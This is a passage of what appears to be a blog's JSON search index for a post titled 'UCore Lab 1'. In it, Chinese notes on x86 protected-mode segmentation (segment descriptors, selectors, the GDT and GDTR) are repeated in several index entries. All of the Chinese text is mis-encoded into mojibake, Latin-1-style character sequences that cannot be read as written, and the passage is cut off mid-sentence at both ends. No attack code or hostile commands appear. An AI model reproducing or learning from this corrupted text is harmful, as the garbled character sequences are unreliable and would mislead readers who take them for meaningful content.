Indicatorï¼ŒTIï¼‰ï¼š1ä½ï¼Œé€‰æ‹©åº”è¯¥è®¿é—®å“ªä¸€ä¸ªæè¿°ç¬¦è¡¨ã€‚0ä»£è¡¨åº”è¯¥è®¿é—®å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ï¼Œ1ä»£è¡¨åº”è¯¥è®¿é—®å±€éƒ¨æè¿°ç¬¦è¡¨ï¼ˆLDTï¼‰ã€‚ è¯·æ±‚ç‰¹æƒçº§ï¼ˆRequested Privilege Levelï¼ŒRPLï¼‰ï¼šä½ä¸¤ä½ï¼Œä¿æŠ¤æœºåˆ¶ã€‚ ç”±æ®µé€‰æ‹©å­å¾—åˆ°çš„æ®µæè¿°ç¬¦ï¼Œå†å¾—åˆ°æ®µçš„åŸºå€ï¼Œæœ€ååŠ ä¸Šåç§»å°±å¾—åˆ°äº†ä¸€ä¸ªçº¿æ€§åœ°å€ã€‚åœ¨æœªå¼€å¯åˆ†é¡µæœºåˆ¶æ—¶ï¼Œçº¿æ€§åœ°å€å³ä¸ºç‰©ç†åœ°å€ã€‚ å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¤§æ•°ç»„æ¥ç®¡ç†é‚£ä¹ˆå¤šçš„æ®µï¼Œè¿™ä¸ªæ•°ç»„æˆ‘ä»¬ç§°ä¸ºå…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ï¼Œå®ƒä¿å­˜äº†å„æ®µçš„æ®µæè¿°ç¬¦ï¼Œç®€ç§°æ®µè¡¨ã€‚ å…¨å±€æè¿°ç¬¦è¡¨çš„èµ·å§‹åœ°å€ä¿å­˜åœ¨å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨GDTRä¸­ã€‚GDTRé•¿48ä½ï¼Œå…¶ä¸­é«˜32ä½ä¸ºåŸºåœ°å€ï¼Œä½16ä½ä¸ºæ®µç•Œé™ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#å»ºç«‹æ®µæ˜ å°„"},{"categories":["Pwning"],"content":"å»ºç«‹æ®µæ˜ å°„å„æ®µå¯„å­˜å™¨æŒ‡å‘äº†ä¸åŒæ®µçš„åŸºå€ï¼Œè€Œåœ¨æ¯ä¸ªæ®µçš„å¼€å§‹æœ‰æ®µæè¿°ç¬¦ã€‚ æ®µæè¿°ç¬¦ åœ¨åˆ†æ®µå­˜å‚¨ç®¡ç†æœºåˆ¶çš„ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªæ®µç”±å¦‚ä¸‹ä¸‰ä¸ªå‚æ•°è¿›è¡Œå®šä¹‰ï¼šæ®µåŸºåœ°å€(Base Address)ã€æ®µç•Œé™(Limit)å’Œæ®µå±æ€§(Attributes) æ®µåŸºåœ°å€ï¼šè§„å®šçº¿æ€§åœ°å€ç©ºé—´ä¸­æ®µçš„èµ·å§‹åœ°å€ã€‚ä»»ä½•ä¸€ä¸ªæ®µéƒ½å¯ä»¥ä»32ä½çº¿æ€§åœ°å€ç©ºé—´ä¸­çš„ä»»ä½•ä¸€ä¸ªå­—èŠ‚å¼€å§‹ï¼Œä¸ç”¨åƒå®æ¨¡å¼ä¸‹è§„å®šè¾¹ç•Œå¿…é¡»è¢«16æ•´é™¤ã€‚ æ®µç•Œé™ï¼šè§„å®šæ®µçš„å¤§å°ã€‚å¯ä»¥ä»¥å­—èŠ‚ä¸ºå•ä½æˆ–ä»¥4Kå­—èŠ‚ä¸ºå•ä½ã€‚ æ®µå±æ€§ï¼šç¡®å®šæ®µçš„å„ç§æ€§è´¨ã€‚ æ®µå±æ€§ä¸­çš„ç²’åº¦ä½ï¼ˆGranularityï¼‰ï¼Œç”¨ç¬¦å·Gæ ‡è®°ã€‚G=0è¡¨ç¤ºæ®µç•Œé™ä»¥å­—èŠ‚ä½ä½å•ä½ï¼Œ20ä½çš„ç•Œé™å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯1å­—èŠ‚è‡³1Må­—èŠ‚ï¼Œå¢é‡ä¸º1å­—èŠ‚ï¼›G=1è¡¨ç¤ºæ®µç•Œé™ä»¥4Kå­—èŠ‚ä¸ºå•ä½ï¼Œäºæ˜¯20ä½çš„ç•Œé™å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯4Kå­—èŠ‚è‡³4Gå­—èŠ‚ï¼Œå¢é‡ä¸º4Kå­—èŠ‚ã€‚ ç±»å‹ï¼ˆTYPEï¼‰ï¼šç”¨äºåŒºåˆ«ä¸åŒç±»å‹çš„æè¿°ç¬¦ã€‚å¯è¡¨ç¤ºæ‰€æè¿°çš„æ®µæ˜¯ä»£ç æ®µè¿˜æ˜¯æ•°æ®æ®µï¼Œæ‰€æè¿°çš„æ®µæ˜¯å¦å¯è¯»/å†™/æ‰§è¡Œï¼Œæ®µçš„æ‰©å±•æ–¹å‘ç­‰ã€‚å…¶4bitä»å·¦åˆ°å³åˆ†åˆ«æ˜¯ æ‰§è¡Œä½ï¼šç½®1æ—¶è¡¨ç¤ºå¯æ‰§è¡Œï¼Œç½®0æ—¶è¡¨ç¤ºä¸å¯æ‰§è¡Œï¼› ä¸€è‡´ä½ï¼šç½®1æ—¶è¡¨ç¤ºä¸€è‡´ç æ®µï¼Œç½®0æ—¶è¡¨ç¤ºéä¸€è‡´ç æ®µï¼› è¯»å†™ä½ï¼šç½®1æ—¶è¡¨ç¤ºå¯è¯»å¯å†™ï¼Œç½®0æ—¶è¡¨ç¤ºåªè¯»ï¼› è®¿é—®ä½ï¼šç½®1æ—¶è¡¨ç¤ºå·²è®¿é—®ï¼Œç½®0æ—¶è¡¨ç¤ºæœªè®¿é—®ã€‚ æè¿°ç¬¦ç‰¹æƒçº§ï¼ˆDescriptor Privilege Levelï¼‰ï¼ˆDPLï¼‰ï¼šç”¨æ¥å®ç°ä¿æŠ¤æœºåˆ¶ã€‚ æ®µå­˜åœ¨ä½ï¼ˆSegment-Present bitï¼‰ï¼šå¦‚æœè¿™ä¸€ä½ä¸º0ï¼Œåˆ™æ­¤æè¿°ç¬¦ä¸ºéæ³•çš„ï¼Œä¸èƒ½è¢«ç”¨æ¥å®ç°åœ°å€è½¬æ¢ã€‚å¦‚æœä¸€ä¸ªéæ³•æè¿°ç¬¦è¢«åŠ è½½è¿›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼Œå¤„ç†å™¨ä¼šç«‹å³äº§ç”Ÿå¼‚å¸¸ã€‚æ“ä½œç³»ç»Ÿå¯ä»¥ä»»æ„çš„ä½¿ç”¨è¢«æ ‡è¯†ä¸ºå¯ç”¨ï¼ˆAVAILABLEï¼‰çš„ä½ã€‚ å·²è®¿é—®ä½ï¼ˆAccessed bitï¼‰ï¼šå½“å¤„ç†å™¨è®¿é—®è¯¥æ®µï¼ˆå½“ä¸€ä¸ªæŒ‡å‘è¯¥æ®µæè¿°ç¬¦çš„é€‰æ‹©å­è¢«åŠ è½½è¿›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼‰æ—¶ï¼Œå°†è‡ªåŠ¨è®¾ç½®è®¿é—®ä½ã€‚æ“ä½œç³»ç»Ÿå¯æ¸…é™¤è¯¥ä½ã€‚ æ®µé€‰æ‹©å­åœ¨ä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­ï¼Œä¼šä¿å­˜ä¸€å—åŒºåŸŸå«æ®µé€‰æ‹©å­ã€‚ çº¿æ€§åœ°å€éƒ¨åˆ†çš„é€‰æ‹©å­æ˜¯ç”¨æ¥é€‰æ‹©å“ªä¸ªæè¿°ç¬¦è¡¨å’Œåœ¨è¯¥è¡¨ä¸­ç´¢å¼•å“ªä¸ªæè¿°ç¬¦çš„ã€‚é€‰æ‹©å­å¯ä»¥åšä¸ºæŒ‡é’ˆå˜é‡çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œå¯¹åº”ç”¨ç¨‹åºå‘˜æ˜¯å¯è§çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æ˜¯ç”±è¿æ¥åŠ è½½å™¨æ¥è®¾ç½®çš„ã€‚ æ®µé€‰æ‹©å­ç»“æ„ ç´¢å¼•ï¼ˆIndexï¼‰ï¼šé«˜13ä½ï¼Œåœ¨æè¿°ç¬¦è¡¨ä¸­ä»8192ä¸ªæè¿°ç¬¦ä¸­é€‰æ‹©ä¸€ä¸ªæè¿°ç¬¦ã€‚å¤„ç†å™¨è‡ªåŠ¨å°†è¿™ä¸ªç´¢å¼•å€¼ä¹˜ä»¥8ï¼ˆæè¿°ç¬¦çš„é•¿åº¦ï¼‰ï¼Œå†åŠ ä¸Šæè¿°ç¬¦è¡¨çš„åŸºå€æ¥ç´¢å¼•æè¿°ç¬¦è¡¨ï¼Œä»è€Œé€‰å‡ºä¸€ä¸ªåˆé€‚çš„æè¿°ç¬¦ã€‚ è¡¨æŒ‡ç¤ºä½ï¼ˆTable Indicatorï¼ŒTIï¼‰ï¼š1ä½ï¼Œé€‰æ‹©åº”è¯¥è®¿é—®å“ªä¸€ä¸ªæè¿°ç¬¦è¡¨ã€‚0ä»£è¡¨åº”è¯¥è®¿é—®å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ï¼Œ1ä»£è¡¨åº”è¯¥è®¿é—®å±€éƒ¨æè¿°ç¬¦è¡¨ï¼ˆLDTï¼‰ã€‚ è¯·æ±‚ç‰¹æƒçº§ï¼ˆRequested Privilege Levelï¼ŒRPLï¼‰ï¼šä½ä¸¤ä½ï¼Œä¿æŠ¤æœºåˆ¶ã€‚ ç”±æ®µé€‰æ‹©å­å¾—åˆ°çš„æ®µæè¿°ç¬¦ï¼Œå†å¾—åˆ°æ®µçš„åŸºå€ï¼Œæœ€ååŠ ä¸Šåç§»å°±å¾—åˆ°äº†ä¸€ä¸ªçº¿æ€§åœ°å€ã€‚åœ¨æœªå¼€å¯åˆ†é¡µæœºåˆ¶æ—¶ï¼Œçº¿æ€§åœ°å€å³ä¸ºç‰©ç†åœ°å€ã€‚ å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¤§æ•°ç»„æ¥ç®¡ç†é‚£ä¹ˆå¤šçš„æ®µï¼Œè¿™ä¸ªæ•°ç»„æˆ‘ä»¬ç§°ä¸ºå…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ï¼Œå®ƒä¿å­˜äº†å„æ®µçš„æ®µæè¿°ç¬¦ï¼Œç®€ç§°æ®µè¡¨ã€‚ å…¨å±€æè¿°ç¬¦è¡¨çš„èµ·å§‹åœ°å€ä¿å­˜åœ¨å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨GDTRä¸­ã€‚GDTRé•¿48ä½ï¼Œå…¶ä¸­é«˜32ä½ä¸ºåŸºåœ°å€ï¼Œä½16ä½ä¸ºæ®µç•Œé™ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#æ®µæè¿°ç¬¦"},{"categories":["Pwning"],"content":"å»ºç«‹æ®µæ˜ å°„å„æ®µå¯„å­˜å™¨æŒ‡å‘äº†ä¸åŒæ®µçš„åŸºå€ï¼Œè€Œåœ¨æ¯ä¸ªæ®µçš„å¼€å§‹æœ‰æ®µæè¿°ç¬¦ã€‚ æ®µæè¿°ç¬¦ åœ¨åˆ†æ®µå­˜å‚¨ç®¡ç†æœºåˆ¶çš„ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªæ®µç”±å¦‚ä¸‹ä¸‰ä¸ªå‚æ•°è¿›è¡Œå®šä¹‰ï¼šæ®µåŸºåœ°å€(Base Address)ã€æ®µç•Œé™(Limit)å’Œæ®µå±æ€§(Attributes) æ®µåŸºåœ°å€ï¼šè§„å®šçº¿æ€§åœ°å€ç©ºé—´ä¸­æ®µçš„èµ·å§‹åœ°å€ã€‚ä»»ä½•ä¸€ä¸ªæ®µéƒ½å¯ä»¥ä»32ä½çº¿æ€§åœ°å€ç©ºé—´ä¸­çš„ä»»ä½•ä¸€ä¸ªå­—èŠ‚å¼€å§‹ï¼Œä¸ç”¨åƒå®æ¨¡å¼ä¸‹è§„å®šè¾¹ç•Œå¿…é¡»è¢«16æ•´é™¤ã€‚ æ®µç•Œé™ï¼šè§„å®šæ®µçš„å¤§å°ã€‚å¯ä»¥ä»¥å­—èŠ‚ä¸ºå•ä½æˆ–ä»¥4Kå­—èŠ‚ä¸ºå•ä½ã€‚ æ®µå±æ€§ï¼šç¡®å®šæ®µçš„å„ç§æ€§è´¨ã€‚ æ®µå±æ€§ä¸­çš„ç²’åº¦ä½ï¼ˆGranularityï¼‰ï¼Œç”¨ç¬¦å·Gæ ‡è®°ã€‚G=0è¡¨ç¤ºæ®µç•Œé™ä»¥å­—èŠ‚ä½ä½å•ä½ï¼Œ20ä½çš„ç•Œé™å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯1å­—èŠ‚è‡³1Må­—èŠ‚ï¼Œå¢é‡ä¸º1å­—èŠ‚ï¼›G=1è¡¨ç¤ºæ®µç•Œé™ä»¥4Kå­—èŠ‚ä¸ºå•ä½ï¼Œäºæ˜¯20ä½çš„ç•Œé™å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯4Kå­—èŠ‚è‡³4Gå­—èŠ‚ï¼Œå¢é‡ä¸º4Kå­—èŠ‚ã€‚ ç±»å‹ï¼ˆTYPEï¼‰ï¼šç”¨äºåŒºåˆ«ä¸åŒç±»å‹çš„æè¿°ç¬¦ã€‚å¯è¡¨ç¤ºæ‰€æè¿°çš„æ®µæ˜¯ä»£ç æ®µè¿˜æ˜¯æ•°æ®æ®µï¼Œæ‰€æè¿°çš„æ®µæ˜¯å¦å¯è¯»/å†™/æ‰§è¡Œï¼Œæ®µçš„æ‰©å±•æ–¹å‘ç­‰ã€‚å…¶4bitä»å·¦åˆ°å³åˆ†åˆ«æ˜¯ æ‰§è¡Œä½ï¼šç½®1æ—¶è¡¨ç¤ºå¯æ‰§è¡Œï¼Œç½®0æ—¶è¡¨ç¤ºä¸å¯æ‰§è¡Œï¼› ä¸€è‡´ä½ï¼šç½®1æ—¶è¡¨ç¤ºä¸€è‡´ç æ®µï¼Œç½®0æ—¶è¡¨ç¤ºéä¸€è‡´ç æ®µï¼› è¯»å†™ä½ï¼šç½®1æ—¶è¡¨ç¤ºå¯è¯»å¯å†™ï¼Œç½®0æ—¶è¡¨ç¤ºåªè¯»ï¼› è®¿é—®ä½ï¼šç½®1æ—¶è¡¨ç¤ºå·²è®¿é—®ï¼Œç½®0æ—¶è¡¨ç¤ºæœªè®¿é—®ã€‚ æè¿°ç¬¦ç‰¹æƒçº§ï¼ˆDescriptor Privilege Levelï¼‰ï¼ˆDPLï¼‰ï¼šç”¨æ¥å®ç°ä¿æŠ¤æœºåˆ¶ã€‚ æ®µå­˜åœ¨ä½ï¼ˆSegment-Present bitï¼‰ï¼šå¦‚æœè¿™ä¸€ä½ä¸º0ï¼Œåˆ™æ­¤æè¿°ç¬¦ä¸ºéæ³•çš„ï¼Œä¸èƒ½è¢«ç”¨æ¥å®ç°åœ°å€è½¬æ¢ã€‚å¦‚æœä¸€ä¸ªéæ³•æè¿°ç¬¦è¢«åŠ è½½è¿›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼Œå¤„ç†å™¨ä¼šç«‹å³äº§ç”Ÿå¼‚å¸¸ã€‚æ“ä½œç³»ç»Ÿå¯ä»¥ä»»æ„çš„ä½¿ç”¨è¢«æ ‡è¯†ä¸ºå¯ç”¨ï¼ˆAVAILABLEï¼‰çš„ä½ã€‚ å·²è®¿é—®ä½ï¼ˆAccessed bitï¼‰ï¼šå½“å¤„ç†å™¨è®¿é—®è¯¥æ®µï¼ˆå½“ä¸€ä¸ªæŒ‡å‘è¯¥æ®µæè¿°ç¬¦çš„é€‰æ‹©å­è¢«åŠ è½½è¿›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼‰æ—¶ï¼Œå°†è‡ªåŠ¨è®¾ç½®è®¿é—®ä½ã€‚æ“ä½œç³»ç»Ÿå¯æ¸…é™¤è¯¥ä½ã€‚ æ®µé€‰æ‹©å­åœ¨ä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­ï¼Œä¼šä¿å­˜ä¸€å—åŒºåŸŸå«æ®µé€‰æ‹©å­ã€‚ çº¿æ€§åœ°å€éƒ¨åˆ†çš„é€‰æ‹©å­æ˜¯ç”¨æ¥é€‰æ‹©å“ªä¸ªæè¿°ç¬¦è¡¨å’Œåœ¨è¯¥è¡¨ä¸­ç´¢å¼•å“ªä¸ªæè¿°ç¬¦çš„ã€‚é€‰æ‹©å­å¯ä»¥åšä¸ºæŒ‡é’ˆå˜é‡çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œå¯¹åº”ç”¨ç¨‹åºå‘˜æ˜¯å¯è§çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æ˜¯ç”±è¿æ¥åŠ è½½å™¨æ¥è®¾ç½®çš„ã€‚ æ®µé€‰æ‹©å­ç»“æ„ ç´¢å¼•ï¼ˆIndexï¼‰ï¼šé«˜13ä½ï¼Œåœ¨æè¿°ç¬¦è¡¨ä¸­ä»8192ä¸ªæè¿°ç¬¦ä¸­é€‰æ‹©ä¸€ä¸ªæè¿°ç¬¦ã€‚å¤„ç†å™¨è‡ªåŠ¨å°†è¿™ä¸ªç´¢å¼•å€¼ä¹˜ä»¥8ï¼ˆæè¿°ç¬¦çš„é•¿åº¦ï¼‰ï¼Œå†åŠ ä¸Šæè¿°ç¬¦è¡¨çš„åŸºå€æ¥ç´¢å¼•æè¿°ç¬¦è¡¨ï¼Œä»è€Œé€‰å‡ºä¸€ä¸ªåˆé€‚çš„æè¿°ç¬¦ã€‚ è¡¨æŒ‡ç¤ºä½ï¼ˆTable Indicatorï¼ŒTIï¼‰ï¼š1ä½ï¼Œé€‰æ‹©åº”è¯¥è®¿é—®å“ªä¸€ä¸ªæè¿°ç¬¦è¡¨ã€‚0ä»£è¡¨åº”è¯¥è®¿é—®å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ï¼Œ1ä»£è¡¨åº”è¯¥è®¿é—®å±€éƒ¨æè¿°ç¬¦è¡¨ï¼ˆLDTï¼‰ã€‚ è¯·æ±‚ç‰¹æƒçº§ï¼ˆRequested Privilege Levelï¼ŒRPLï¼‰ï¼šä½ä¸¤ä½ï¼Œä¿æŠ¤æœºåˆ¶ã€‚ ç”±æ®µé€‰æ‹©å­å¾—åˆ°çš„æ®µæè¿°ç¬¦ï¼Œå†å¾—åˆ°æ®µçš„åŸºå€ï¼Œæœ€ååŠ ä¸Šåç§»å°±å¾—åˆ°äº†ä¸€ä¸ªçº¿æ€§åœ°å€ã€‚åœ¨æœªå¼€å¯åˆ†é¡µæœºåˆ¶æ—¶ï¼Œçº¿æ€§åœ°å€å³ä¸ºç‰©ç†åœ°å€ã€‚ å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¤§æ•°ç»„æ¥ç®¡ç†é‚£ä¹ˆå¤šçš„æ®µï¼Œè¿™ä¸ªæ•°ç»„æˆ‘ä»¬ç§°ä¸ºå…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ï¼Œå®ƒä¿å­˜äº†å„æ®µçš„æ®µæè¿°ç¬¦ï¼Œç®€ç§°æ®µè¡¨ã€‚ å…¨å±€æè¿°ç¬¦è¡¨çš„èµ·å§‹åœ°å€ä¿å­˜åœ¨å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨GDTRä¸­ã€‚GDTRé•¿48ä½ï¼Œå…¶ä¸­é«˜32ä½ä¸ºåŸºåœ°å€ï¼Œä½16ä½ä¸ºæ®µç•Œé™ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#æ®µé€‰æ‹©å­"},{"categories":["Pwning"],"content":"å»ºç«‹æ®µæ˜ å°„å„æ®µå¯„å­˜å™¨æŒ‡å‘äº†ä¸åŒæ®µçš„åŸºå€ï¼Œè€Œåœ¨æ¯ä¸ªæ®µçš„å¼€å§‹æœ‰æ®µæè¿°ç¬¦ã€‚ æ®µæè¿°ç¬¦ åœ¨åˆ†æ®µå­˜å‚¨ç®¡ç†æœºåˆ¶çš„ä¿æŠ¤æ¨¡å¼ä¸‹ï¼Œæ¯ä¸ªæ®µç”±å¦‚ä¸‹ä¸‰ä¸ªå‚æ•°è¿›è¡Œå®šä¹‰ï¼šæ®µåŸºåœ°å€(Base Address)ã€æ®µç•Œé™(Limit)å’Œæ®µå±æ€§(Attributes) æ®µåŸºåœ°å€ï¼šè§„å®šçº¿æ€§åœ°å€ç©ºé—´ä¸­æ®µçš„èµ·å§‹åœ°å€ã€‚ä»»ä½•ä¸€ä¸ªæ®µéƒ½å¯ä»¥ä»32ä½çº¿æ€§åœ°å€ç©ºé—´ä¸­çš„ä»»ä½•ä¸€ä¸ªå­—èŠ‚å¼€å§‹ï¼Œä¸ç”¨åƒå®æ¨¡å¼ä¸‹è§„å®šè¾¹ç•Œå¿…é¡»è¢«16æ•´é™¤ã€‚ æ®µç•Œé™ï¼šè§„å®šæ®µçš„å¤§å°ã€‚å¯ä»¥ä»¥å­—èŠ‚ä¸ºå•ä½æˆ–ä»¥4Kå­—èŠ‚ä¸ºå•ä½ã€‚ æ®µå±æ€§ï¼šç¡®å®šæ®µçš„å„ç§æ€§è´¨ã€‚ æ®µå±æ€§ä¸­çš„ç²’åº¦ä½ï¼ˆGranularityï¼‰ï¼Œç”¨ç¬¦å·Gæ ‡è®°ã€‚G=0è¡¨ç¤ºæ®µç•Œé™ä»¥å­—èŠ‚ä½ä½å•ä½ï¼Œ20ä½çš„ç•Œé™å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯1å­—èŠ‚è‡³1Må­—èŠ‚ï¼Œå¢é‡ä¸º1å­—èŠ‚ï¼›G=1è¡¨ç¤ºæ®µç•Œé™ä»¥4Kå­—èŠ‚ä¸ºå•ä½ï¼Œäºæ˜¯20ä½çš„ç•Œé™å¯è¡¨ç¤ºçš„èŒƒå›´æ˜¯4Kå­—èŠ‚è‡³4Gå­—èŠ‚ï¼Œå¢é‡ä¸º4Kå­—èŠ‚ã€‚ ç±»å‹ï¼ˆTYPEï¼‰ï¼šç”¨äºåŒºåˆ«ä¸åŒç±»å‹çš„æè¿°ç¬¦ã€‚å¯è¡¨ç¤ºæ‰€æè¿°çš„æ®µæ˜¯ä»£ç æ®µè¿˜æ˜¯æ•°æ®æ®µï¼Œæ‰€æè¿°çš„æ®µæ˜¯å¦å¯è¯»/å†™/æ‰§è¡Œï¼Œæ®µçš„æ‰©å±•æ–¹å‘ç­‰ã€‚å…¶4bitä»å·¦åˆ°å³åˆ†åˆ«æ˜¯ æ‰§è¡Œä½ï¼šç½®1æ—¶è¡¨ç¤ºå¯æ‰§è¡Œï¼Œç½®0æ—¶è¡¨ç¤ºä¸å¯æ‰§è¡Œï¼› ä¸€è‡´ä½ï¼šç½®1æ—¶è¡¨ç¤ºä¸€è‡´ç æ®µï¼Œç½®0æ—¶è¡¨ç¤ºéä¸€è‡´ç æ®µï¼› è¯»å†™ä½ï¼šç½®1æ—¶è¡¨ç¤ºå¯è¯»å¯å†™ï¼Œç½®0æ—¶è¡¨ç¤ºåªè¯»ï¼› è®¿é—®ä½ï¼šç½®1æ—¶è¡¨ç¤ºå·²è®¿é—®ï¼Œç½®0æ—¶è¡¨ç¤ºæœªè®¿é—®ã€‚ æè¿°ç¬¦ç‰¹æƒçº§ï¼ˆDescriptor Privilege Levelï¼‰ï¼ˆDPLï¼‰ï¼šç”¨æ¥å®ç°ä¿æŠ¤æœºåˆ¶ã€‚ æ®µå­˜åœ¨ä½ï¼ˆSegment-Present bitï¼‰ï¼šå¦‚æœè¿™ä¸€ä½ä¸º0ï¼Œåˆ™æ­¤æè¿°ç¬¦ä¸ºéæ³•çš„ï¼Œä¸èƒ½è¢«ç”¨æ¥å®ç°åœ°å€è½¬æ¢ã€‚å¦‚æœä¸€ä¸ªéæ³•æè¿°ç¬¦è¢«åŠ è½½è¿›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼Œå¤„ç†å™¨ä¼šç«‹å³äº§ç”Ÿå¼‚å¸¸ã€‚æ“ä½œç³»ç»Ÿå¯ä»¥ä»»æ„çš„ä½¿ç”¨è¢«æ ‡è¯†ä¸ºå¯ç”¨ï¼ˆAVAILABLEï¼‰çš„ä½ã€‚ å·²è®¿é—®ä½ï¼ˆAccessed bitï¼‰ï¼šå½“å¤„ç†å™¨è®¿é—®è¯¥æ®µï¼ˆå½“ä¸€ä¸ªæŒ‡å‘è¯¥æ®µæè¿°ç¬¦çš„é€‰æ‹©å­è¢«åŠ è½½è¿›ä¸€ä¸ªæ®µå¯„å­˜å™¨ï¼‰æ—¶ï¼Œå°†è‡ªåŠ¨è®¾ç½®è®¿é—®ä½ã€‚æ“ä½œç³»ç»Ÿå¯æ¸…é™¤è¯¥ä½ã€‚ æ®µé€‰æ‹©å­åœ¨ä¸€ä¸ªæ®µå¯„å­˜å™¨ä¸­ï¼Œä¼šä¿å­˜ä¸€å—åŒºåŸŸå«æ®µé€‰æ‹©å­ã€‚ çº¿æ€§åœ°å€éƒ¨åˆ†çš„é€‰æ‹©å­æ˜¯ç”¨æ¥é€‰æ‹©å“ªä¸ªæè¿°ç¬¦è¡¨å’Œåœ¨è¯¥è¡¨ä¸­ç´¢å¼•å“ªä¸ªæè¿°ç¬¦çš„ã€‚é€‰æ‹©å­å¯ä»¥åšä¸ºæŒ‡é’ˆå˜é‡çš„ä¸€éƒ¨åˆ†ï¼Œä»è€Œå¯¹åº”ç”¨ç¨‹åºå‘˜æ˜¯å¯è§çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æ˜¯ç”±è¿æ¥åŠ è½½å™¨æ¥è®¾ç½®çš„ã€‚ æ®µé€‰æ‹©å­ç»“æ„ ç´¢å¼•ï¼ˆIndexï¼‰ï¼šé«˜13ä½ï¼Œåœ¨æè¿°ç¬¦è¡¨ä¸­ä»8192ä¸ªæè¿°ç¬¦ä¸­é€‰æ‹©ä¸€ä¸ªæè¿°ç¬¦ã€‚å¤„ç†å™¨è‡ªåŠ¨å°†è¿™ä¸ªç´¢å¼•å€¼ä¹˜ä»¥8ï¼ˆæè¿°ç¬¦çš„é•¿åº¦ï¼‰ï¼Œå†åŠ ä¸Šæè¿°ç¬¦è¡¨çš„åŸºå€æ¥ç´¢å¼•æè¿°ç¬¦è¡¨ï¼Œä»è€Œé€‰å‡ºä¸€ä¸ªåˆé€‚çš„æè¿°ç¬¦ã€‚ è¡¨æŒ‡ç¤ºä½ï¼ˆTable Indicatorï¼ŒTIï¼‰ï¼š1ä½ï¼Œé€‰æ‹©åº”è¯¥è®¿é—®å“ªä¸€ä¸ªæè¿°ç¬¦è¡¨ã€‚0ä»£è¡¨åº”è¯¥è®¿é—®å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ï¼Œ1ä»£è¡¨åº”è¯¥è®¿é—®å±€éƒ¨æè¿°ç¬¦è¡¨ï¼ˆLDTï¼‰ã€‚ è¯·æ±‚ç‰¹æƒçº§ï¼ˆRequested Privilege Levelï¼ŒRPLï¼‰ï¼šä½ä¸¤ä½ï¼Œä¿æŠ¤æœºåˆ¶ã€‚ ç”±æ®µé€‰æ‹©å­å¾—åˆ°çš„æ®µæè¿°ç¬¦ï¼Œå†å¾—åˆ°æ®µçš„åŸºå€ï¼Œæœ€ååŠ ä¸Šåç§»å°±å¾—åˆ°äº†ä¸€ä¸ªçº¿æ€§åœ°å€ã€‚åœ¨æœªå¼€å¯åˆ†é¡µæœºåˆ¶æ—¶ï¼Œçº¿æ€§åœ°å€å³ä¸ºç‰©ç†åœ°å€ã€‚ å…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå¤§æ•°ç»„æ¥ç®¡ç†é‚£ä¹ˆå¤šçš„æ®µï¼Œè¿™ä¸ªæ•°ç»„æˆ‘ä»¬ç§°ä¸ºå…¨å±€æè¿°ç¬¦è¡¨ï¼ˆGDTï¼‰ï¼Œå®ƒä¿å­˜äº†å„æ®µçš„æ®µæè¿°ç¬¦ï¼Œç®€ç§°æ®µè¡¨ã€‚ å…¨å±€æè¿°ç¬¦è¡¨çš„èµ·å§‹åœ°å€ä¿å­˜åœ¨å…¨å±€æè¿°ç¬¦è¡¨å¯„å­˜å™¨GDTRä¸­ã€‚GDTRé•¿48ä½ï¼Œå…¶ä¸­é«˜32ä½ä¸ºåŸºåœ°å€ï¼Œä½16ä½ä¸ºæ®µç•Œé™ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#å…¨å±€æè¿°ç¬¦è¡¨gdt"},{"categories":["Pwning"],"content":"ä¿æŠ¤æ¨¡å¼ä½¿èƒ½å»ºç«‹æ˜ å°„åï¼Œä½¿èƒ½ä¿æŠ¤æ¨¡å¼ã€‚é€šè¿‡ä¸€ä¸ªç‰¹å®šçš„å¯„å­˜å™¨ï¼Œç³»ç»Ÿæ€§å¯„å­˜å™¨CRTï¼Œå°†å…¶bit 